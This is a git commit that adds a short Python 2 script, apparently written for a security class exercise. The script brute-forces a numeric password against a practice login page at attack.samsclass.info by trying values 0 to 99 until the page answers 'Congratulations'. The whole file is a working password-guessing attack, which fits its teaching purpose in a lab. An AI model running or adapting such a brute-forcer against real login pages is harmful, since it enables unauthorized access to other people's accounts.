0300746facfee944f155605156d943b0810f49ad
laureli mallek <laureli@artemis.net>
2015-03-21 09:41:59 -0700

    first pw brute-forcer for spring class

---
+++ brute.py
@@ -0,0 +1,28 @@
+import pycurl
+from StringIO import StringIO
+
+start_url = 'http://attack.samsclass.info/samsgame1/2/login2-active-vjfj3kj.php?pw='
+
+for n in range(0, 100):
+  final_url = start_url+str(n)
+
+  buffer = StringIO()
+  c = pycurl.Curl()
+  c.setopt(c.URL, final_url)
+  c.setopt(c.WRITEDATA, buffer)
+  c.perform()
+  c.close()
+
+  body = buffer.getvalue()
+  # Body is a string in some encoding.
+  # In Python 2, we can print it without knowing what the encoding is.
+
+  b = "Congratulations"
+
+  if b in body:
+    print final_url
+    print(body)
+    break
+  else:
+    print("nope, not yet.")
+    print("   "+final_url)
